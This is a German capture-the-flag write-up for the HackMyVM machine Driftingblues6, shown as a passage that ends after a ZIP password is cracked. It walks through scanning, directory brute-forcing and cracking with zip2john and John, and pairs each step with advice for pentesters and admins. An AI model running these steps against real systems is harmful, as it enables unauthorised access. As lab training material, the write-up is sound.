@@ -1,0 +1,1414 @@
+﻿
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues6 - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Driftingblues6 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ll</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">./eximhacker.sh</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">./pwn</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p>
+                Meine initiale Aufklärung begann mit der Identifizierung der Ziel-IP-Adresse im lokalen Netzwerk. Ich habe einen ARP-Scan verwendet, um aktive Hosts zu finden und nach der spezifischen VirtualBox-Vendor-ID zu filtern, um das Zielsystem einzugrenzen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">arp-scan -l | grep &quot;PCS&quot; | awk &apos;{print $1}&apos;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.55</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` scannt das lokale Netzwerk nach aktiven Geräten. Die Ausgabe wird an `grep "PCS"` weitergeleitet, um Zeilen zu finden, die "PCS" enthalten (was auf die PCS Systemtechnik Vendor ID von VirtualBox hindeutet). Der gefilterte Output wird dann an `awk '{print $1}'` übergeben, um nur das erste Feld, die IP-Adresse, auszugeben. Das Ergebnis ist die IP-Adresse `<span class="command">192.168.2.55</span>`, die sehr wahrscheinlich die des Zielsystems ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein effizienter und gezielter Weg, die IP-Adresse des Zielsystems in einem bekannten Netzwerksegment zu identifizieren, insbesondere wenn man weiß, dass es sich um eine virtuelle Maschine (hier VirtualBox) handelt. Dieser Schritt liefert die notwendige IP für weitere Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die gefundene IP-Adresse als Ziel für alle weiteren Aktionen.
+                <br><strong>Empfehlung (Admin):</strong> Sei dir bewusst, dass MAC-Adressen und Vendor-Informationen Hinweise auf die zugrundeliegende Infrastruktur geben können.
+            </p>
+
+             <p>
+                 Ich habe die gefundene IP-Adresse zu meiner lokalen Hosts-Datei hinzugefügt, um das Ziel über seinen Hostnamen ansprechen zu können.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">vi /etc/hosts</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.55    drifting.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei, um eine manuelle Zuordnung der IP-Adresse 192.168.2.55 zum Hostnamen drifting.hmv vorzunehmen. Diese lokale Konfiguration vereinfacht die Referenzierung des Ziels in nachfolgenden Befehlen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dies ist ein reiner Komfort-Schritt für den Pentester. Es hat keine Auswirkungen auf die Sicherheit des Zielsystems, verbessert aber die Lesbarkeit der Befehle im Bericht.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Verwendung des Hostnamens ist nun möglich.
+                 <br><strong>Empfehlung (Admin):</strong> Keine direkte sicherheitsrelevante Empfehlung aus diesem Schritt.
+             </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p>
+                Nachdem die Ziel-IP identifiziert war, habe ich einen ersten schnellen Check des Webservers auf Port 80 mit `curl` gemacht, um die Header zu überprüfen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl -Iv http://drifting.hmv</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+* Host drifting.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: <span class="command">192.168.2.55</span>
+*   Trying 192.168.2.55:80...
+* Connected to drifting.hmv (<span class="command">192.168.2.55</span>) <span class="command">PORT</span> 80
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: drifting.hmv
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; Date: Sat, 21 Jun 2025 21:24:02 GMT
+Date: Sat, 21 Jun 2025 21:24:02 GMT
+&lt; Server: <span class="password">Apache/2.2.22 (Debian)</span>
+Server: Apache/2.2.22 (Debian)
+&lt; Last-Modified: Mon, 15 Mar 2021 13:36:18 GMT
+Last-Modified: Mon, 15 Mar 2021 13:36:18 GMT
+&lt; ETag: &quot;36f3-2ee-5bd9355a0d880&quot;
+ETag: &quot;36f3-2ee-5bd9355a0d880&quot;
+&lt; Accept-Ranges: bytes
+Accept-Ranges: bytes
+&lt; Content-Length: <span class="command">750</span>
+Content-Length: 750
+&lt; Vary: Accept-Encoding
+Vary: Accept-Encoding
+&lt; Content-Type: text/html
+Content-Type: text/html
+&lt; X-Pad: avoid browser bug
+X-Pad: avoid browser bug
+&lt;
+
+* Connection #0 to host drifting.hmv left intact
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `curl -Iv` Befehl führt einen HEAD-Request durch und zeigt die vollen Header der Antwort von Port 80. Die Antwort ist 200 OK. Der `Server` Header identifiziert den Webserver als **Apache/2.2.22 (Debian)**. Dies ist eine sehr alte und wahrscheinlich anfällige Version von Apache. Es werden auch ETag-Informationen und das Fehlen von `X-Frame-Options` und `X-Content-Type-Options` Headern angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung des sehr veralteten Apache 2.2.22 ist ein kritischer Fund. Diese Version hat viele bekannte Schwachstellen. Das Fehlen von Sicherheits-Headern ist eine geringere Schwachstelle, aber die alte Server-Version ist der Hauptfokus.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Enumeration der Webanwendung, die von diesem Apache gehostet wird. Suche gezielt nach bekannten Schwachstellen oder Exploits für Apache 2.2.22.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere Apache umgehend auf eine unterstützte Version. Implementiere die empfohlenen Sicherheits-Header.
+            </p>
+
+            <p>
+                Ich habe Nikto auf Port 80 ausgeführt, um eine automatisierte Schwachstellenanalyse des Webservers zu erhalten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.55</span>
++ Target Hostname:    <span class="command">192.168.2.55</span>
++ Target <span class="command">PORT</span>:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-21 23:23:43 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="password">Apache/2.2.22 (Debian)</span>
++ /: Server may leak inodes via ETags, header found with file /, inode: <span class="command">14067</span>, size: <span class="command">750</span>, mtime: Mon Mar 15 14:36:18 2021. See: <span class="command">[Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ <span class="command">/textpattern/textpattern/</span>: Retrieved x-powered-by header: <span class="password">PHP/5.5.38-1~dotdeb+7.1</span>.
++ <span class="command">/textpattern/textpattern/</span>: Cookie txp_test_cookie created without the httponly flag. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies]</span>
++ <span class="command">/robots.txt</span>: Entry &apos;/textpattern/textpattern/&apos; is returned a non-forbidden or redirect HTTP code (200). See: <span class="command">[Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
++ <span class="command">/robots.txt</span>: contains 1 entry which should be manually viewed. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]</span>
++ <span class="command">/index</span>: Uncommon header &apos;tcn&apos; found, with contents: list.
++ <span class="command">/index</span>: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for &apos;index&apos; were found: index.html. See: <span class="command">[Link: http://www.wisec.it/sectou.php?id=4698ebdc59d15 | Ziel: http://www.wisec.it/sectou.php?id=4698ebdc59d15]</span>,[Link: https://exchange.xforce.ibmcloud.com/vulnerabilities/8275 | Ziel: https://exchange.xforce.ibmcloud.com/vulnerabilities/8275]
++ <span class="password">Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ <span class="command">OPTIONS</span>: <span class="command">Allowed HTTP Methods: OPTIONS, GET, HEAD, <span class="command">POST</span> .</span>
++ <span class="command">/icons/README</span>: <span class="command">Apache default file found. See: [Link: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/ | Ziel: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/]</span>
++ <span class="command">/#wp-config.php#</span>: <span class="command">#wp-config.<span class="command">php</span># file found. This file contains the credentials.</span>
++ <span class="command">8910 requests: 0 error(s) and 13 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-21 23:23:53 (GMT2) (10 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto bestätigt erneut den veralteten Apache 2.2.22 Server. Es findet wieder fehlende Sicherheits-Header und die ETag-Informationsleckage. Wichtige neue Funde sind: Hinweise auf `/textpattern/textpattern/` mit dem Header `x-powered-by: PHP/5.5.38`, was die verwendete PHP-Version identifiziert (ebenfalls sehr veraltet und anfällig). Es meldet, dass `/textpattern/textpattern/` in `robots.txt` erwähnt wird, aber mit 200 OK antwortet (nicht blockiert ist). Das Verzeichnislisting auf `/icons/README` wird gefunden. Ein potenziell exponiertes `#wp-config.php#` File wird ebenfalls gemelgt (obwohl dies bei Chromee keine Rolle spielte, ist es hier wieder ein Hinweis).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto liefert sehr wertvolle Informationen. Die Identifizierung von PHP 5.5.38 und Textpattern (implizit durch den Pfad) sind neue, wichtige Angriffsflächen. Beide Versionen sind veraltet und weisen bekannte Schwachstellen auf. Das Verzeichnis `/textpattern/textpattern/` ist nun ein klarer Fokus für die weitere Enumeration.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/textpattern/textpattern/` genauer. Finde die genaue Version von Textpattern. Suche nach bekannten Schwachstellen für Apache 2.2.22, PHP 5.5.38 und die gefundene Textpattern-Version. Prüfe den Inhalt von `robots.txt` manuell und `/icons/README`.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere Apache, PHP und Textpattern umgehend auf unterstützte Versionen. Implementiere Sicherheits-Header. Schütze sensible Verzeichnisse.
+            </p>
+
+            <p>
+                Ich habe einen detaillierten Port-Scan mit Nmap auf allen Ports durchgeführt, um eine vollständige Übersicht der offenen Dienste zu erhalten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.55</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at <span class="command">2025-06-21 23:23 CEST</span>
+<span class="command">Nmap scan report for drifting.hmv (192.168.2.55)</span>
+Host is up (<span class="command">0.00018s latency</span>).
+Not shown: <span class="command">65534 closed tcp PORTs (reset)</span>
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">80/tcp open  http    Apache httpd 2.2.22 ((Debian))</span>
+<span class="command">|_http-title: driftingblues</span>
+<span class="command">|_http-server-header: Apache/2.2.22 (Debian)</span>
+<span class="command">| http-robots.<span class="command">txt</span>: 1 disallowed entry </span>
+<span class="command">|_/textpattern/textpattern</span>
+<span class="command">MAC Address: 08:00:27:21:5F:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Aggressive OS guesses: Linux 3.0 (96%), Linux 2.6.32 - 3.10 (96%), Android 9 (Linux 4.9) (95%), Linux 3.2 - 3.16 (95%), <span class="command">OpenWrt</span> Chaos Calmer 15.05 (Linux 3.18) <span class="command">or</span> Designated Driver (Linux 4.1 <span class="command">or</span> 4.4) (95%), <span class="command">OpenWrt</span> Barrier Breaker (Linux 3.10) (95%), Linux 4.1 (94%), Linux 2.6.32 - 3.5 (94%), Linux 3.0 - 3.1 (93%), Asus RT-N10 router <span class="command">or</span> AXIS 211A Network Camera (Linux 2.6) (93%)</span>
+<span class="command">No exact <span class="command">OS</span> matches for host (test conditions n<span class="command">on</span>-ideal).</span>
+Network Distance: <span class="command">1 hop</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   <span class="command">0.18 ms drifting.hmv (192.168.2.55)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap d<span class="command">one</span>: 1 IP address (1 host up) scanned in 12.10 seconds</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.55 | grep open </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">80/tcp open  http    Apache httpd 2.2.22 ((Debian))</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan mit den Optionen `-sC -sS -sV -T5 -A` (Skripterkennung, SYN-Scan, Versionserkennung, schnelle Ausführung, aggressive Erkennung) auf allen Ports (`-p-`) bestätigte, dass nur Port 80 geöffnet ist und Apache httpd 2.2.22 hostet. Der HTTP-Titel ist "driftingblues". Nmap identifizierte ebenfalls den Eintrag in `robots.txt` (`/textpattern/textpattern/`). Keine anderen Dienste wurden gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Bestätigung, dass nur Port 80 offen ist, konzentriert den Fokus vollständig auf den Webserver. Der sehr veraltete Apache und die Hinweise auf Textpattern und PHP sind die primären Angriffsvektoren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Richte alle weiteren Enumerations- und Angriffsversuche auf den Webserver auf Port 80.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass keine unnötigen Ports geöffnet sind.
+            </p>
+
+            <p>
+                Ich habe Gobuster erneut verwendet, diesmal unter Berücksichtigung des Hinweises aus `robots.txt` bezüglich der `.zip`-Erweiterung, um möglicherweise versteckte gezippte Dateien zu finden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">gobuster dir -u &quot;http://drifting.hmv&quot; -w &quot;/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&quot; -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b &apos;503,404,403&apos; -e --no-error -k </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] <span class="command">Url:                     http://drifting.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/<span class="command">directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   503,404,403
+[+] Extensions:              pl,rar,exe,rtf,yaml,sh,<span class="command">phtml</span>,pem,js.<span class="command">map</span>,<span class="command">php</span>,xls,deb,rpm,raw,exp,<span class="command">icon</span>,csh,config,<span class="command">jpg</span>,db,<span class="command">tar</span>,docx,<span class="command">pdf</span>,<span class="command">pHtml</span>,accdb,html,<span class="command">dll</span>,<span class="command">svg</span>,<span class="command">cgi</span>,<span class="command">txt</span>,<span class="command">png</span>,bak,json,conf,eps,<span class="command">diff</span>,<span class="command">ln</span>,xml,bat,<span class="command">crt</span>,<span class="command">c</span>,old,aspx,asp,<span class="command">doc</span>,<span class="command">ELF</span>,mod,py,xlsx,elf,mdb,<span class="command">ps1</span>,kdbx,<span class="command">pub</span>,sql,gz,jpeg,csv,lib,desc,<span class="command">zip</span>,java
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://drifting.hmv/index                (Status: 200) [Size: 750]</span>
+<span class="command">http://drifting.hmv/index.html           (Status: 200) [Size: 750]</span>
+<span class="password">http://drifting.hmv/db                   (Status: 200) [Size: 53656]</span>
+<span class="password">http://drifting.hmv/db.png               (Status: 200) [Size: 53656]</span>
+<span class="command">http://drifting.hmv/robots               (Status: 200) [Size: 110]</span>
+<span class="command">http://drifting.hmv/robots.txt           (Status: 200) [Size: 110]</span>
+<span class="password">http://drifting.hmv/spammer              (Status: 200) [Size: 179]</span>
+<span class="password">http://drifting.hmv/spammer.zip          (Status: 200) [Size: 179]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster fand dieses Mal, unter Berücksichtigung der `.zip` Erweiterung, mehrere interessante Dateien und Verzeichnisse: `index` und `index.html` (die Hauptseite), `robots` und `robots.txt` (bekannt). Neu und sehr interessant sind `db` und `db.png` (beide Status 200, identische, ungewöhnlich große Größe), sowie `spammer` und `spammer.zip` (beide Status 200, identische kleine Größe). Dies bestätigt die Existenz dieser Dateien.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden von `db`, `db.png`, `spammer` und `spammer.zip` ist ein sehr guter Fortschritt. Die Tatsache, dass `db` und `db.png` identische Größen haben, deutet darauf hin, dass es sich bei `db.png` möglicherweise um eine umbenannte Datenbankdatei handelt, die als Bild getarnt ist. `spammer` und `spammer.zip` sind ebenfalls verdächtig und klein, was auf Anmeldedaten oder einen Hinweis hindeuten könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Dateien `db`, `db.png`, `spammer` und `spammer.zip` detailliert. Lade sie herunter und prüfe ihren Inhalt (Text, Metadaten, Binärinhalt). Die `.zip` Datei (`spammer.zip`) sollte auf einen Passwortschutz geprüft und geknackt werden.
+                <br><strong>Empfehlung (Admin):</strong> Entferne unnötige Dateien vom Webserver. Benenne sensible Dateien nicht um, um sie zu tarnen, da dies durch Tools wie Gobuster und Größenvergleiche aufgedeckt werden kann.
+            </p>
+
+            <p>
+                Ich habe den Inhalt der `robots.txt` erneut geprüft, diesmal unter Berücksichtigung der neuen Gobuster-Funde.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/robots.txt | Ziel: http://drifting.hmv/robots.txt]</span>
+User-agent: *
+Disallow: <span class="command">/textpattern/textpattern</span>
+
+<span class="password">d<span class="command">on</span>t forget to add .<span class="command">zip</span> extension to your dir-brute</span>
+<span class="password">;)</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `robots.txt` enthält neben dem Disallow-Eintrag für `/textpattern/textpattern/` einen weiteren Kommentar: "`dont forget to add .zip extension to your dir-brute ;)`". Dies ist ein expliziter Hinweis darauf, dass bestimmte Dateien auf dem Server existieren, die nur gefunden werden, wenn man bei der Verzeichnissuche auch nach der `.zip`-Erweiterung sucht. Dieser Hinweis erklärt die Gobuster-Funde von `spammer.zip` und `db.zip` (obwohl `db.zip` nicht direkt gefunden wurde, die Existenz von `db` und `db.png` lässt darauf schließen).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser explizite Hinweis bestätigt, dass das Hinzufügen der `.zip` Erweiterung zur Verzeichnissuche beabsichtigt war und zu wichtigen Funden führt. Dies ist ein klassischer "Easy" Level Hinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die mit `.zip` gefundenen Dateien detailliert.
+                <br><strong>Empfehlung (Admin):</strong> Speichere niemals Hinweise auf versteckte Dateien in öffentlich zugänglichen Dateien wie `robots.txt`.
+            </p>
+
+            <p>
+                Ich habe das Verzeichnis `/textpattern/textpattern/` aufgerufen, das in `robots.txt` erwähnt wurde und von Nikto als PHP-Anwendung identifiziert wurde.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/ | Ziel: http://drifting.hmv/textpattern/textpattern/]</span>
+
+Go to content
+Log in to Textpattern
+Name
+<span class="command">Password</span>
+
+Remain logged in with this browser Help
+
+Forgot <span class="command">password</span>?
+
+<span class="command">driftingblues</span>
+</pre>
+                 </div>
+             </div>
+             <p>
+                 Das ist die Login-Seite für Textpattern.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>___________________________________________________________________________________________________________________
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php | Ziel: http://drifting.hmv/textpattern/textpattern/index.php]</span>
+
+</pre>
+                 </div>
+             </div>
+
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Aufruf von `/textpattern/textpattern/` zeigt die Login-Seite für das Textpattern CMS. Es gibt Felder für "Name" und "Password" und einen "Log in" Button. Das CMS ist also aktiv und erfordert Authentifizierung. Der Name "driftingblues" wird angezeigt, möglicherweise der Standardbenutzername oder der Blog-Name. Der Aufruf von `index.php` im selben Verzeichnis zeigt eine leere Seite oder Header, da die Login-Logik wahrscheinlich in der Hauptseite liegt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Textpattern ist eine Content-Management-System (CMS) und damit eine typische Webanwendungs-Angriffsfläche. Da ich die Login-Seite gefunden habe, ist dies ein klares Ziel für Brute-Force-Angriffe oder die Suche nach Anmeldedaten. Die Version (noch unbekannt) ist entscheidend.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach Standardanmeldedaten für Textpattern oder Anmeldedaten aus anderen Quellen (gefundene Dateien). Finde die genaue Version von Textpattern, um nach spezifischen Schwachstellen zu suchen.
+                <br><strong>Empfehlung (Admin):</strong> Schütze Login-Seiten vor Brute-Force-Angriffen (Rate Limiting). Ändere Standardanmeldedaten. Halte das CMS und alle Plugins/Themes aktuell.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p>
+                 Nach den Gobuster-Funden und dem Hinweis in `robots.txt` habe ich die Datei `spammer.zip` heruntergeladen und versucht, sie zu entpacken.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">mkdir drifting</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">cd drifting</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">mv ~/spammer.zip .</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">unzip spammer.zip</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Archive:  spammer.<span class="command">zip</span>
+<span class="command">[spammer.zip] creds.txt password:</span> </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe ein Verzeichnis `drifting` erstellt, dorthin gewechselt und die von Gobuster gefundene Datei `spammer.zip` von meinem Home-Verzeichnis (`~`) verschoben (`mv`) in das neue Verzeichnis. Beim Versuch, das ZIP-Archiv zu entpacken (`unzip spammer.zip`), wurde ich zur Eingabe eines Passworts aufgefordert. Dies bedeutet, dass das Archiv passwortgeschützt ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ZIP-Archiv enthält offensichtlich eine Datei (`creds.txt`, wie in der `unzip`-Ausgabe zu sehen), die geschützt werden soll. Das Passwort für dieses Archiv ist notwendig, um an die darin enthaltenen Informationen zu gelangen. Dies ist ein klarer nächster Schritt: das ZIP-Passwort knacken.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Extrahiere den Hash des ZIP-Archivs und versuche, ihn offline mit einem Tool wie John the Ripper oder Hashcat und einer geeigneten Wortliste (z.B. RockYou) zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Vermeide das Speichern von passwortgeschützten Archiven in öffentlich zugänglichen Web-Verzeichnissen, insbesondere wenn die Passwörter leicht zu erraten oder in Wortlisten enthalten sind.
+            </p>
+
+             <p>
+                 Um das Passwort für `spammer.zip` zu knacken, habe ich `zip2john` verwendet, um den Hash aus der ZIP-Datei zu extrahieren, und ihn dann mit John the Ripper und der RockYou-Wortliste bearbeitet.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">zip2john spammer.zip &gt; hash</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">ver 2.0 spammer.<span class="command">zip</span>/creds.<span class="command">txt</span> <span class="command">PKZIP</span> Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 <span class="command">TYPE</span>=0</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Using default input encoding: UTF-8
+Loaded <span class="command">1 password hash (PKZIP [32/64])</span>
+Will run <span class="command">12 OpenMP threads</span>
+Press &apos;q&apos; <span class="command">or</span> Ctrl-C to abort, almost any <span class="command">other</span> key for status
+<span class="password">myspace4         (spammer.zip/creds.txt)</span>
